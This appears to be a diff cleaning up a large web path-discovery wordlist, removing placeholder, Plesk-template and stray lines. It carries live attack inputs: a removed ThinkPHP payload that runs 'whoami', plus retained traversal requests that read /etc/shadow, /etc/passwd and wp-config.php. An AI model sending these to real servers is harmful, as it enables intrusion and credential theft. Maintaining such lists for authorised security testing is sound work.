@@ -139,7 +139,6 @@ _www
 !.gitignore
 !.htaccess
 !.htpasswd
-@
 bak/
 CFIDE/administrator/
 log/error.log
@@ -3762,7 +3761,6 @@ oauth/signin/
 obj.pkl
 objects
 odbc
-Office/graph.php#xxe
 ojspdemos
 oladmin
 olap/
@@ -5677,7 +5675,6 @@ swagger-ui
 apidocs
 swagger
 v1/swagger.json
-Bangram, [19.07.20 20:13]
 back.sql 
 backup.sql 
 accounts.sql 
@@ -5749,7 +5746,6 @@ server/logs/download?logType=error&logName=../../../../../../../../etc/shadow&lo
 plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com
 assets/file:%2f%2f/etc/passwd
 wp—admin/admin—ajax.php?action=duplicator_download&file=/../wp-config.php
-public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
 cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd
 _layouts/15/downloadexternaldata.aspx
 tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
@@ -5952,7 +5948,6 @@ upload/savant-explo.pl
 cms/hongcms/admin/index.php/language”.
 allgemein_transfer.php
 admin/semcms_menu.php
-[mini_cms_1.0.1_path]/index.php
 www/cve/fiyocms-1669403ec38e3f100d17786e06bc33c94152fcf3/user/edit
 modules.php
 usergroup/addrbook_list.php
@@ -5986,8 +5981,6 @@ html/setpriority.php
 include/inc_accessfail.php
 hongcms/admin/index.php
 max/dal/admin/session.php
-[kamtiez]/news_detail.php
-public/uploads/[uploaded
 modules/downloads/language/lang-greek.php
 locales/$phpdig_language-language.php
 dapur/apps/app_config/controller/backuper.php
@@ -6033,7 +6026,6 @@ wp-content/plugins/wp-symposium/ajax/mail_functions.php
 actionphp/download.file.php
 engine/ajax/editnews.php
 post-template.php
-[wbnewspath]/admin/sendmsg.php
 getid3.demo.dirscan.php
 adframe.php
 htmlmodulemanager.php
@@ -6123,7 +6115,6 @@ cms/front_content.php
 phpblog__0_1_alpha/includes/functions.php
 edit-form-advanced.php
 components/com_performs/com_performs/performs.php
-[w-agora-directory]/delete_forum.php
 frontaccount-1.12.ta/manufacturing/view/wo_production_view.php
 standard/tests/url/parse_url_basic_006.php
 e107/e107_admin/banlist.php
@@ -6147,7 +6138,6 @@ phplive/message_box.php
 libraries/get_foreign.lib.php
 library/dbtech/security/action/sessions.php
 enigmadir/admin/detay_yorum.asp
-[guetbook-folder]/lang/codes-english.php
 shards/
 index.cgi
 htmlmodule/proprietary.php
@@ -6174,7 +6164,6 @@ include/api/interface/collapsed.php
 downfile/email.php
 foojan/index.php
 tt_cp.php
-plesk/client@1/domain@1/hosting/file-manager/rename/
 easycms-master/index.php
 irc.php
 index.php/invoices/view/
@@ -6192,7 +6181,6 @@ unitconverter.php
 default-orange/footer.php
 smb/web
 wp-content/plugins/page-flip-image-gallery/books/getconfig.php
-plesk/client@3/domain@2/hosting/file-manager/create-dir/
 attrvalidator.php
 xadmin/html/cm_datasource_summary.jsp
 monitoring_ged/ajax.php
@@ -6206,7 +6194,6 @@ composer/vendor/james-heinrich/getid3/demos/demo.browse.php
 loaders/netscape.inc.php
 inc/encryption.php
 smb/app-image/gallery/catalogid/apscatalog/type/screenshot/
-plesk/client@3/domain@2/hosting/file-manager/edit/
 script_pat/shared/controller/text.ctrl.php
 invoice/invoiceajax.php
 frontaccount-1.12.ta/reporting/rep101.php
@@ -6260,7 +6247,6 @@ get_foreign.lib.php
 modules/pages/_properties.php
 certlocal.cmd
 writers/blogroll.inc.php
-plesk/client@2/domain@1/certificate@
 atutor/content/chat/2/msgs/1.message
 wp-content/plugins/mail-masta/inc/campaign/count_of_send.php
 main/backup.php
@@ -6338,7 +6324,6 @@ auth/extauth/extauthprocess.inc.php
 user/controller.php
 web/init.php
 list.php,
-[mini_blog_1.0.1_path]/index.php
 modules/attributewizardpro/file_upload.php
 frontaccount-1.12.ta/purchasing/view/view_supp_payment.php
 phpmychat/chat/edituser.php
@@ -6372,7 +6357,6 @@ enterprise/mobile-monitor/
 tools.php
 php/deltax.php
 gsquery/gsquery.php
-plesk/client@1/domain@1/hosting/file-manager/view/
 ifunctions.php
 embedded_ace_get_task.cgi
 token/text.php
@@ -6381,7 +6365,6 @@ app/spider/spider.admincp.php
 rebuild_f.php
 frontaccount-1.12.ta/inventory/reorder_level.php
 smb/admin-home/installed-applications/
-[w-agora-directory]delete_forum.php
 history.php
 webspell/admin/admincenter.php
 includes/themen_portal_mitte.php
@@ -6493,7 +6476,6 @@ capacity_per_label/index.php
 vistabb/includes/functions_mod_user.php
 configdata.html
 mysqldumper_path/sql.php
-[upload_dir]/shell.php
 import/file/lib.php
 forgotpassword.php
 openbiblio/circ/mbr_fields.php
@@ -6528,7 +6510,6 @@ lib/download_template.php
 paget
 inc/conn.php
 prefs.php
-plesk/client@1/domain@1/traffic-hosting
 del.php
 rewrite.php
 code.php
@@ -6586,7 +6567,6 @@ ubb/index.php
 html/en/confunvmodbus.html
 helpdesk/merge.php
 sysinfo.class.php
-plesk/client@2/domain@1/backup/schedule/
 logos_clients/1.php.
 wizard/design
 1124829658jtun_ennluxdb.x86
@@ -6610,7 +6590,6 @@ expo/index.php
 interface/globals.php
 search.php
 smb/role/create/
-[my_simple_forum_path]/index.php
 injector/removeempty.php
 common.inc.php
 lib/toolkit/class.administrationpage.php
@@ -6813,7 +6792,6 @@ apps/zxtm/locallog.cgi
 pages/download/default/ops/search.php
 gw/webacc
 seacms/adm1n.
-plesk/client@/domain@1/backup/local-repository/
 html/user/allgemein_transfer.php
 link-exchange-52.php
 packages/comments/comment.class.php
@@ -6968,7 +6946,6 @@ topsy.js
 template/vert/index.php
 phpjk/userarea/authenticate.php
 layout/layout.class.php
-[guetbook-folder]/image.php
 external-link.jspa
 includes/ipban.php
 nc-cms/index.php
@@ -7007,7 +6984,6 @@ admin/articles.php
 modules/newbb_plus/admin/forum_config.php
 data/reports/referringurlswithqueries when
 errmsg.inc.php
-plesk/client@1/domain@1/dns/
 cgi-bin/pass&quot
 faq/faqajax.php
 patient_file/letter.php
@@ -7051,7 +7027,6 @@ u/jsp/common/download.jsp
 add_ons/mail_this_entry/mail_autocheck.php
 nmi/index.php
 admin/ip.php
-[sinecms_path]/mods.php
 goform/system/factory
 htdocs/php.php
 manager/admin_ajax.php
@@ -7093,7 +7068,6 @@ modules/menu
 maxxschedule/logon.asp
 include_files/quick_reply.php
 guis/admin/application/controllers/usercontroller.php
-plesk/client@2/register-domain/
 ossim/forensics/base_stat_alerts.php
 dvr.ini
 hashtopussy/agents.php
@@ -7152,7 +7126,6 @@ home/torrpgug/trade.brynamics.xyz/vendor/laravel/framework/src/illuminate/databa
 frontaccount-1.12.ta/sales/inquiry/customer_allocation_inquiry.php
 popojicms/po-admin/route.php
 framework/initialize.php
-[m-core_path]/db/uyelik.mdb
 edit/comment
 templates/freeway/boxes/loginbox.php
 clanlite-1.23.01.2005/conf/conf-php.php
@@ -7229,7 +7202,6 @@ pages.asp
 menu/menuprincipal.php
 goform/setsmsautoredirectsetting
 modules/users/edit_user.php
-uploads/[uploaded
 smarty_internal_config.php
 freescripts.php
 ubb/ubbt.inc.php
@@ -7328,7 +7300,6 @@ archives.php
 frontaccount-1.12.ta/manufacturing/inquiry/bom_cost_inquiry.php
 wp-content/plugins/mail-masta/inc/lists/view-list.php
 getid3/write.lyrics3.php
-plesk/client@3/domain@2/hosting/file-manager/rename/
 detaillist.php
 header.php
 redpass.cgi
@@ -7348,7 +7319,6 @@ sources/subs-package.php
 popup.php
 library/think/db/query.php
 module/admin_group/add_modify_group.php
-[pfa_path]/index.php
 viewthread.php
 xampp/cds.php
 file..php
@@ -7414,9 +7384,7 @@ dms/policy/rep_request.php
 pickle/src/download.php
 banner.inc.php
 nvweb_routes.php
-[mailing_dir]/inc/initdb.php
 prweb/randomtoken/serviceexport/configurations.zip
-plesk/client@1/domain@1/backup/local-repository/upload/
 phpbb/uploads/cmd.php
 dialog.php
 includes/template-loader.php
@@ -7454,7 +7422,6 @@ admin/admin_edit.php
 lib/control/backend/menus.control.php
 www/scm/controlleroo.php
 inc_adminfail.php
-conferences/[conference-name]/author/show_paper_details.php
 arm-image-installer/pull-request/10
 ident/disconnect.php
 core/database.class.php
@@ -7484,7 +7451,6 @@ release/version.php
 leap.php
 rpc2
 profile/myprofile.php
-[upload_dir]/
 functions_portal.php
 tikilib.php
 htdocs/admin/adm/test.php
@@ -7507,7 +7473,6 @@ detail.asp
 artefact/file/extract.php
 spider-event-calendar/calendar_functions.php
 w3b/index.php
-plesk/client@1/
 contenido42vv10/contenidofinal/contenido/main_upl.php
 admin/config/confmgr.php
 article/mrarticles.php
@@ -7534,7 +7499,6 @@ admin/media-upload-sq_button.php
 library/editor/editor.php
 details/index.php
 admin/home/click-promo/id/promo_click_mobile
-[mybb-directory]/inc/datahandlers/event.php
 email.php
 assets/edit/account-owner.php
 helpers/echo_helper.php
@@ -7598,7 +7562,6 @@ less/tree/call.php
 wp-admin/customize.php
 members.asp
 phpmydesktop1/index.php
-[ememberspro_path]/users.mdb
 api/update/wifi/ssid
 gallery/folderview.asp
 opt/zendto/bin/unlockuser.php
@@ -7621,12 +7584,10 @@ gallery/controllers/uploader.php
 slogin_lib.inc.php
 serendipity_config.inc.php
 useronline.php
-[w-agora-directory]/index.php
 portal/page
 php/wizard/wizard_setup_08a.php
 plesk/start-page/
 templates/topbar/_menubar.html.php
-plesk/client@3/domain@2/hosting/
 phpmyadmin/libraries/fpdf/ufpdf.php
 cord.php
 source/html/index.php
@@ -7670,9 +7631,7 @@ inc/parser/xhtml.php
 attrdef/uri/email/simplecheck.php
 centreon/main.php
 u/jsp/settings/heapdumps.jsp
-home/grgfidcd/public_html/cctoronto/mod/[nst
 panda
-[wbnewspath]/admin/directory.php
 bin/save_settings.php
 mail/settings.html
 mydevice/index.jsp
@@ -7704,7 +7663,6 @@ lib-updates.inc.php
 dir_login.asp
 charts.php
 controller/main.php
-[synergiser_path]/index.php
 injector/safeobject.php
 p47h/video_show.php
 weblication/
@@ -8000,7 +7958,6 @@ modules/menu/lib/treemenu.inc.php
 class.performs.php
 bizdirectory/status.php
 getid3/write.id3v2.php
-plesk/client@2/domain@1/domain-alias@
 cms/icms/admincp.php
 modules/wfdownloads/viewcat.php
 store/item.php
@@ -8086,7 +8043,6 @@ weblog_posting.php
 modules/filemanager/dunzip.php
 includes/filter_getpost.php
 library/stageloader.php
-plesk/client@2/backup/local-repository/
 req.php
 ciscowlc2.html
 rest/helpers/rest_event.php
@@ -8148,7 +8104,6 @@ admin/semcms_link.php
 git/tree/treeload_git.class.php
 home/…
 plateforme/code/inc/common.inc.php
-[saxon-directory]/admin/edit-item.php
 php/payment/paypal_failure.php
 lepton_1.1.x/upload/modules/wysiwyg/info.php
 path_script/phpexplorator.php
@@ -8286,7 +8241,6 @@ phpmyadmin/setup/lib/configfile.class.php
 svn/viewvc.php
 local_config.php
 cgi/b/_voip_/stats/
-plesk/client@2/domain@1/hosting/performance/
 includes/add_allow.php
 admin/list.php
 modules/file.php
@@ -8381,7 +8335,6 @@ standard/tests/url/parse_url_basic_001.php
 api/admin/content/save
 forum/viewtopic.php
 mod.cmstranslator.php
-[simplogdir]/archive.php
 setup/upgrader.php
 livedraft/sajax.php
 ecrire/tools/syslog/index.php
@@ -8414,7 +8367,6 @@ data/config.php
 deletethread.php
 de_identification_forms/find_immunization_popup.php
 sms/cat.php
-plesk/client@1/domain@1/hosting/file-manager/
 definitioncache/null.php
 php-microcms/index.php
 fonctions/template.php
@@ -8426,7 +8378,6 @@ xavier/admin/editgroup.php
 lib/pear/html/quickform/rule/email.php
 lowgraphic/index.inc.php
 kakumei/profile-edit.php
-plesk/client@3/domain@2/hosting/file-manager/view/
 domains/sitebuilder_edit.php
 bootstrap.php
 users/class/modsetting.php
@@ -8529,7 +8480,6 @@ php/phplot.php
 dscms_v1.1/public/index.php/admin/admin/add.html
 bin/viewfile/twiki/twikidocgraphics
 pppoe.cgi
-plesk/client@2/domain@1/hosting/file-manager/
 whois.php
 includes/js/edit_layer.php
 dbfs.php
@@ -8568,7 +8518,6 @@ wp-content/wp-plugs/cbi–referral–manager/getnetworksites.php
 include_files/quick_search.php
 adodb_lite/adodb.inc.php
 mail/logout.html
-[ajlogin_path]/ajlogin.mdb
 captcha/shared.php
 components/com_jambook/jxtemplate.php
 xavier/admin/adminuseredit.php
@@ -8577,7 +8526,6 @@ aboutinfo.php
 holiday.php
 includes/dashboard.php
 remote_management.php&quot
-plesk/client@2/domain@1/hosting/aspdotnet/
 attrtransform/name.php
 notes/notesajax.php
 domainmod/assets/edit/ip-address.php
@@ -8646,7 +8594,6 @@ writers/rss.inc.php
 lib/db.class.php
 modules/rtmessageadd.php
 misc/backwards%20compatibility/remotehtmlview.php
-[cauposhop]/index.php
 amember/plugins/payment/authorize_aim/authorize_aim.inc.php
 pages.php
 moderate.php
@@ -8740,7 +8687,6 @@ jgs_portal_include/jgs_portal_links.php
 attrtransform/namesync.php
 var/www/file.php
 aai/home
-[simplogdir]/imagelist.php
 system/rss.php
 modules/downloads/language/lang-indonesian.php
 system/data/accounts.php
@@ -8777,7 +8723,6 @@ glossaire/index.php
 newssql.inc.php
 dl_sendmail.php
 admin/promotion/
-docebocms/[dc_path]admin/modules/block_media/util.media.php
 en/mware/globus/download_preamble.html
 class.thcms_modul.php
 upload/system/controller/backend/album.php
@@ -8820,7 +8765,6 @@ getid3/write.vorbiscomment.php
 cgi-bin/calendar/calendar.pl
 ecrire/tools/blogroll/edit_link.php
 opencms/system/workplace/admin/accounts/users_list.jsp
-home/[user]/public_html/[service]/myclientbase/core/my_model.php
 test.py.
 pages/edittemplate_step2.php
 sef.php
@@ -8878,7 +8822,6 @@ themes/butterfly/structure.php
 phpmychat/chat/edituser.php3
 ezdir/imagecatalogue/imageview/475/
 tinyevent/index.php
-admin/[module
 puzzle2-2.2.1.ta/puzzle2-latest/core/modules/admin/libs/templates.lib.php
 zen-cart/extras/ipn_test_return.php
 smb/app/details-data/
@@ -9071,7 +9014,6 @@ tftp/fetch_boot_file
 smb/account/switch/id/
 host/minicms-1.10/mc-admin/post.php
 dav_portal/portal/
-[kamtiez]/index.php
 gallery_head.php
 certs/mxview.key
 __mg_admin
@@ -9087,7 +9029,6 @@ attrdef/html/nmtokens.php
 admin/logs.php
 inc/themes/predefined_variables.php
 op.login.php
-[guestbook-directory]/index.php
 libraries/transformations.lib.php
 www/lib/lib/action/admin/tplaction.class.php
 apps/app_comment/controller/insert.php
@@ -9139,7 +9080,6 @@ admin/ops/reports/ops/download.php
 general/status.html
 slims/admin/modules/bibliography/index.php
 composer/vendor/james-heinrich/getid3/demos/demo.mysql.php
-[guestbook-directory]/picture.php
 admin/customer-service-plan/
 include_files/moder_menu.php
 revisions/create.php
@@ -9162,7 +9102,6 @@ webspot/upload/inc/mainheader.inc.php
 modules/poll/showpoll.php
 addfav.php
 phorum/posting.php
-[postnuke_dir]/modules.php
 component/trunk/
 emailarchitect/default.asp
 beescms/admin/admin_admin.php
@@ -9182,7 +9121,6 @@ exec/install.php
 vbugs.php
 admin/install.php
 cashdesk/tpl/ticket.tpl.php
-plesk/admin-alias@/
 pafiledb/includes/rate.php
 themes/$style/info.php
 htmlpurifier/htmlpurifier.autoload.php
@@ -9218,7 +9156,6 @@ phpshe/admin.php
 hdd.htm
 vtigercrm/phprint.php
 censura.php
-[upload_dir]/shell.php.
 webgets/cart.php
 claro_init_global.inc.php
 includes/spaw/class/script.js.php
@@ -9375,7 +9312,6 @@ system/actionspages/_b/contentfiles/gbimageviewer.php
 include_files/forum_statistics.php
 modules/settings/vtiger/actions/companydetailssave.php
 gallerie.php
-courier/1000@/oauth/playground/callback.html
 no5_such3_file7.pl
 lepton_1.1.x/upload/modules/wrapper/add.php
 manager/api_manager.php
@@ -9408,7 +9344,6 @@ admin/loginc.php
 htdocs/core/ajax/box.php
 rebuild_search_index/admin_rebuild_search.php
 clustercontrol/bootstrap.php
-plesk/client@2/custom-buttons/
 templates/freeway/boxes/whos_online.php
 admin/modules/pages/edit.php
 update_components.html
@@ -9461,7 +9396,6 @@ ad/setconfig.php
 pafiledb/includes/team/auth.php
 nagvis/exec.php
 getid3/module.graphic.tiff.php
-data/uploads/[uploaded
 users/login.php
 image-editor-52.php
 web/inc/prerequisites.inc.php
@@ -9489,7 +9423,6 @@ api/sms_check.php
 frogcms1/admin/
 admin.adm.php
 goform/net_webpinggetvalue
-[php-counter]/list.php
 public/code/cp_links.php
 blocks.php
 forums/copyright.php
@@ -9499,12 +9432,9 @@ uwc/base/uwcmain
 corporate/webpages/dashboard/applianceinformation.jsp
 php/wpsc-1.1/wpsc/wpsc-javascript.php
 datetime.php
-plesk/client@1/domain@1/backup/local-repository/
-plesk/client@3/domain@2/hosting/file-manager/permissions/
 modules/style/templates.php
 action.php
 tellafriend.php
-[webulas_path]/db/db.mdb
 viewattach.php
 hunkaray-okul-portali-v11-tr-sql-injection-vuln-4
 document.php
@@ -9532,7 +9462,6 @@ sphider/admin/admin.php
 left_header.inc.php
 advance-realestate/edit-profile.php
 log_downloads.class.inc.php
-[mybb-directory]/member.php
 cgi-bin/bbs/read.cgi
 myphppagetool-0.4.3.ta/myphppagetool/doc/admin/help8.php
 cat.php
@@ -9591,7 +9520,6 @@ sap/bc/nwbc/~testcanvas/
 api/1/enginelist.php
 freeway/mainpage_modules/mainpage.php
 shoptellafriend.asp
-activecalendar/data/[page].php
 wp-content/wp-plugs/social–connect/diagnostics/test.php
 themes/$theme_url/archives.php
 add_voting.php
@@ -9623,7 +9551,6 @@ admin/change.php
 msexcel’
 smb/file/upload/
 inc/lib/control/backend/menus.control.php
-plesk/client@2/domain@1/traffic-hosting
 ticket_displayfields.php
 frontaccount-1.12.ta/purchasing/po_entry_items.php
 enigmadir/arsiv.asp
@@ -9835,7 +9762,6 @@ mystats.php
 pbootcms/admin.php/site/server
 user-login-history-config.php
 vlogin/reg.php
-plesk/client@2/domain@1/hosting/ftp-users/
 scoutflt.cmd
 modx/index.php
 lepton_1.1.x/upload/account/signup.php
@@ -9854,7 +9780,6 @@ diary.php
 pafiledb/includes/admin/auth.php
 frontaccount-1.12.ta/gl/view/bank_transfer_view.php
 symfony/component/httpkernel/httpcache/httpcache.php
-[harikaonline_path]/harikaonline.mdb
 guestmap/
 html/en/index.htm%n
 inc/fy.php
@@ -9990,7 +9915,6 @@ modules/user_search/info.php
 load-scripts.php
 newmsg.php
 modules/calendar/calendar.php
-plesk/client@1/domain@1/backup/ftp-repository/properties/
 concrete5-8.1.0/index.php
 components/com_clickheat/recly/clickheat/cache.php
 aclass/admin_func.php
@@ -10073,7 +9997,6 @@ models/question_model.php
 pages/
 owa/redir.aspx
 wp-admin/edit-link-category-form.php
-[jetbox-directory]/index.php
 downloads/dl-search.php
 st-gallery/example.php
 snmp/tests/bug72479.php
@@ -10105,7 +10028,6 @@ password.cgi
 ecrire/tools/thememng/index.php
 modules/links/showlinks.php
 change_preferences2.php
-[jetbox-directory]/open_tree.php
 blog/data/zblog.mdb
 tp5cms/admin.php/category/delete.html
 mail/calendarsettings.html
@@ -10127,7 +10049,6 @@ opencms/system/workplace/admin/workplace/sessions.jsp
 wp-content/plugins/instasqueeze/lp/index.php
 functions/process_ajax.php
 add_ons.php
-plesk/client@2/domain@1/dns/
 php/multiaddtocart.php
 remotehtmlview.php
 maelostore/admin/
@@ -10159,7 +10080,6 @@ admin/admin_disallow.php
 jgs_portal_ref.php
 ismail/error.php
 main/main_screen.php
-plesk/client@1/domain@1/backup/ftp-repository/
 fax/fax_view.php
 cgit/cgit.cgi/git/objects/
 ban.php
@@ -10289,7 +10209,6 @@ form/viewregistrants.php
 ladder/stats.php
 package.ipk
 functions_file.inc.php
-[webalbum_path]/photo_add-c.php
 export.cfg
 lepton_1.1.x/upload/modules/captcha_control/info.php
 xxxxx/cmsmadesimple/admin/moduleinterface.php
@@ -10340,7 +10259,6 @@ openbiblio/shared/header.php
 torrentflux/dir.php
 admin/affiliate-delete.php
 xoops-2.3.3/htdocs/modules/profile/user.php
-[wbnewspath]/admin/themes.php
 gadgets/definitions/uptime.capacitywhatifgadget/getxenmetrics.php
 ldu/index.php
 oa_html/amsimageselect.jsp
@@ -10414,10 +10332,8 @@ nuke/index.php
 showpic.php
 functions_bu_and_reports.php
 attrtransform/targetblank.php
-[wbnewspath]/admin/comment.php
 libs/xing.php
 do_command.php
-[path]/index.php
 chat//lib/database/
 modules/blocks/pnblocks/button.php
 report.cgi
@@ -10430,7 +10346,6 @@ admin/modules/admindashboard/phpsysinfo/common_admin_functions.php
 grabnext.php
 libraries/display_export.lib.php
 configcontroller.php
-[mybb-directory]/captcha.php
 prism
 discuss/msgreader$1
 admin/banner-delete.php
@@ -10499,7 +10414,6 @@ pear/mail/mail.php
 admin/backup.php
 includes/sessions.php
 minicms-master/minicms-master/mc-admin/conf.php
-forum/users/[username].php
 cal_footer.inc.php
 modules/feature-upload.php
 admincp/ticket_escalate.php
@@ -10633,7 +10547,6 @@ symfony/component/httpkernel/tests/fragment/inlinefragmentrenderertest.php
 wbm/receive_upload.php
 index02.html
 functions_config.inc.php
-[textpattern_g119_path]/textpattern/publish.php
 pub/gentoo/
 smb/email-address/create
 showcat.php
@@ -10772,7 +10685,6 @@ generate_tabs.php
 enigmadir/yorum.asp
 common/autoload.php
 member/uploads_select.php
-plesk/client@1/domain@1/
 admincp/user.php
 oops.php
 index.asp%2e
@@ -10867,7 +10779,6 @@ spl/tests/bug71735.php
 admin-ajax.php
 webcal/tests/all_tests.php
 workarea/activateuser.aspx&quot
-[vigile_cms_path]/index.php/nav=[wikiname]
 db_functions.php
 mod.rss.php
 linkcount
@@ -10940,7 +10851,6 @@ fiyo/dapur/apps/app_article/controller/article_status.php
 archiver-export.inc.php
 en_us/admin/user/manage/add
 include/grant.php
-[awebnewspath]/visview.php
 php/shareyourcart_v2/sdk/views/account-credentials-partial.php
 data/log/年_月_日.log
 maelostore/admin/modul/users/aksi_users.php
@@ -11109,7 +11019,6 @@ spaw/spaw.php
 etereweb/
 ad.php
 mvc/configuration)
-[simplogdir]/preview.php
 elementdef.php
 inc/session.php
 subzs.php
@@ -11144,7 +11053,6 @@ javascript/openwindow.php
 htdocs/web/sitesurvey.php
 _basicfunctions.php
 vpn_openvpn_csc.php
-plesk/client@1/domain@/
 verizonfios3.html
 phplive/super/info.php
 payment/spuser_result.php
@@ -11214,7 +11122,6 @@ components/com_virtuemart/helpers/vmview.php
 caldaily.php
 webcal/includes/settings.php.orig
 viewbugs.php
-[vigile_cms_path]/index.php
 s-cms/admin/ajax.php
 definition.php
 inc/lib/phpmailer.php
@@ -11261,7 +11168,6 @@ components/recly/common/string.php
 frontaccount-1.12.ta/inventory/manage/locations.php
 photo/admin/general_setting.php
 includes/rating.php
-[tilde_path]/index.php
 1.2.0/product/search
 editors/htmlarea/popups/images.php
 calyearlyp.php
@@ -11404,7 +11310,6 @@ user/controllers/users.php
 adodb.inc.php
 libs/htmlheader.php
 joinrequests.php
-plesk/client@1/domain@1/backup/task@/
 db.php
 login_up.php3
 freeway/boxes/whos_online.php
@@ -11578,7 +11483,6 @@ main/finder/finder_navigation.php
 contenido42vv10/contenidofinal/contenido/inc/con_show_tree.inc.php
 core/vb/api/api.php
 contact/index.php
-plesk/client@1/domain@1/backup/schedule/
 phpffl_1_24.ta/phpffl/phpffl_webfiles/program_files/livedraft/admin.php
 lepton_1.1.x/upload/admins/interface/date_formats.php
 www/xycms_v1.7/system/edit_book.php
@@ -11635,7 +11539,6 @@ nuke/banners.php
 fog//index.php
 frontaccount-1.12.ta/gl/manage/gl_accounts.php
 loginfunction.php
-plesk/client@2/domain@1/backup/create/
 urphppage.php
 hashing.php
 yxcms1.4.7/protected/apps/admin/controller/photocontroller.php
@@ -11755,7 +11658,6 @@ admin/glossary.add.php
 external_results.php
 library/think/db/connection.php
 raknet/forum/index.php
-plesk/client@1/shared-ssl/
 netcat/modules/banner.inc.php
 showcategory.php
 admin/commonlib/lib/magic_quotes.php
@@ -11931,7 +11833,6 @@ class/xoopsuser.php
 lib/test.php
 frontaccount-1.12.ta/admin/void_transaction.php
 zorum_3_5/index.php
-plesk/client@1/domain@1/backup/create/
 instantsite/inc.is_root.php
 libs/manager.php
 admin/lib-sessions.inc.php
@@ -11956,7 +11857,6 @@ htmlmodule/iframe.php
 mantisbt-2.3.0/verify.php
 mail/calendar_task.html
 edit_address.php
-[simplogdir]/comments.php
 admincp/announcement.php
 frontaccount-1.12.ta/manufacturing/work_order_add_finished.php
 helpers.php
@@ -12022,7 +11922,6 @@ tagmanage.php
 framework/modules/file/connector/uploader_paste.php
 classes/admin.php
 shared_list.php
-[sinecms_path]/admin/mods_adm.php
 includes/sys.config.php
 bagecms/index.php
 vtigercrm/index.php
@@ -12069,8 +11968,6 @@ wp-content/plugins/mail-masta/inc/campaign/campaign-delete.php
 talkback/install/help.php
 patient_file/encounter/diagnosis_full.php
 php/securimage/securimage_play.php
-[jetbox-directory]/admin/cms/opentree.php
-plesk/client@1/domain@1/hosting/file-manager/edit/
 modules/articles/print.php
 scripts2/dochangeemail
 admin/advertiser-delete.php
@@ -12138,7 +12035,6 @@ phpinventory_demo/
 lib/php/classes.php
 diag_packet_capture.php
 account/details.php
-[jetbox-directory]/main_page.php
 wp-content/wp-plugs/geo–redirector/ajax_functions.php
 main/forum/viewforum.php
 lib/classes/offl_dbobject.php
@@ -12213,7 +12109,6 @@ www/admin/plugin-settings.php
 script_pat/userman/controller/common.function.php
 script/catalog.php
 inc/_version.php
-plesk/client@2/shared-ssl/
 login_validate.php
 upload/system/controller/backend/category.php
 _advanced.php
@@ -12241,7 +12136,6 @@ smb/app/search-data/
 don/list.php
 lib/include.php
 forum/user.php
-[sphiderpath]/index.php
 funkboard/editpost.php
 php/delgroupmembership.php
 typo3/index.php
@@ -12363,7 +12257,6 @@ admin/airline-edit.php
 ajax/sortcategories.php
 webmedia_explorer_3_2_2/wme/templates/main.tpl.php
 lizard/detail.php
-[jetbox-directory]/outputs.php
 bootstrap/class.search.php
 forum/footer.php
 lib/lms.setup.php
@@ -12533,7 +12426,6 @@ apps/app_article/controller/editor.php
 settings/security.php
 auto-modules/forms/_locked.php
 appointments.inc.php
-includes/[value]/login.php
 languages.lib.php
 php/wizard/wizard_setup_04a.php
 adminoptions.php
@@ -12549,7 +12441,6 @@ notes/json.php
 wp-content/plugins/mail-masta/inc/campaign/view-campaign.php
 cgi-bin/payload.luci
 public_html/pafiledb/includes/license.php
-plesk/client@3/domain@2/hosting/file-manager/
 cgi-bin/e-cms/vis/vis.pl
 libraries/relation.lib.php
 forums/viewtopic.php
@@ -12573,7 +12464,6 @@ home/vagrant/code/the-gate/resources/views/welcome.blade.php
 modules/admin/include/en.all_messages2.php
 configurer2.php
 nabopoll.inc.php
-[awebnewspath]/listing.php
 readmessage.jsp
 wp-content/plugins/wp-cumulus/wp-cumulus.php
 class.thcms_content.php
@@ -12594,7 +12484,6 @@ classes/class.usertagoperations.inc.php
 jqform/defaultnodb/default.php
 apply.cgi
 tus_imagenes/c99.php
-[site-with-vote].php
 emails/email.php
 packages/files/file.class.php
 urischeme/nntp.php
@@ -12626,7 +12515,6 @@ viscacha/admin.php
 unit/controller/configcontrollertest.php
 function_upload.php
 shards/login.php
-plesk/client@2/domain@1/odbc/
 platform.class.php
 home/calogic/clmcpreload.php
 modules/credits/credits.php
@@ -12739,7 +12627,6 @@ intranet/browse.php
 bigtree-cms/core/launch.php
 core/tpl/document_actions_pre_headers.tpl.php
 ecrire/tools/utf8convert/index.php
-[w-agora-directory]index.php
 mod.html.php
 display-setting.php
 contenido42vv10/contenidofinal/contenido/tpl/actions_stat.php
@@ -12901,7 +12788,6 @@ onvif/devices
 gallery/hooks/init_gallery.php
 headeruserdata.php
 listmembers.php
-[xtblogcms/index.php
 intruvert/jsp/menu/disp.jsp
 tabs/src/tabswrapper.php
 functions_admin.php
@@ -12920,7 +12806,6 @@ moodle/filter.php
 nagios/cgi-bin/statusmap.cgi
 functions/anti-hack.php
 adduser.php
-[jetbox-directory]/
 components/com_user/models/reset.php
 uploads/include/mysql.class.php
 system_gateways_groups_edit.php
@@ -12936,7 +12821,6 @@ conf/main.cfg.php
 themes.php
 smb/admin-homecookie:
 var/www/xms/application/controllers/verifylogin.php
-flatnuke/forum/users/[username].php
 attrdef/enum.php
 functions/post.php
 parents/login.php
@@ -12954,7 +12838,6 @@ output/pw_text_$language.php
 profile/admin/admin.php
 wp-admin/edit-link-form.php
 admin/logout.php
-docebocms/[dc_path]admin/modules/news/news_class.php
 includes/class-wp-posts-list-table.php
 frontaccount-1.12.ta/inventory/prices.php
 download.html
@@ -12994,7 +12877,6 @@ gallery/helpers/random.php
 goform/logread
 src/sistema/vistas/template/tpl_inicio.php
 classes/debug.php
-docebocms/[dc_path]admin/modules/content/content_class.php
 dev/firmware/check_version.php
 bug_change_status_page.php
 xdashboard/html/jobhistory/
@@ -13103,7 +12985,6 @@ solo/admin-index.do
 goform/getsmsautoredirectsetting
 php/detection_detail_filter.php
 frontaccount-1.12.ta/reporting/rep103.php
-plesk/notification@/
 scripts/editzone
 frontaccount-1.12.ta/gl/manage/currencies.php
 filemanager/handlers/redactor/upload.php
@@ -14143,7 +14024,6 @@ NewsFeed/showPage.php
 NewsOffice/news_show.php
 NixieAffiliate/forms/lostpassword.php
 NmConsole/Login.asp
-NmConsole/Login.asp?bIsJavaScriptDisabled=true&sLoginPassword=&b;tnLogIn=[Log&In]=&sLoginUserName=
 NmConsole/Navigation.asp
 NmConsole/shell.asp
 NmConsole/utility/RenderMap.asp
